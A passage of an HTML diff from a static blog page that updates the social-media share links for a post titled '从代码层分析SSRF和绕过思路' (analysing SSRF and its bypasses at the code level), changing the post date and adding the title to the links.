class="toc-number">7.</span> <span class="toc-text">参考链接:</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&text=从代码层分析SSRF和绕过思路"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&is_video=false&description=从代码层分析SSRF和绕过思路"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从代码层分析SSRF和绕过思路&body=Check out this article: http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&name=从代码层分析SSRF和绕过思路&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
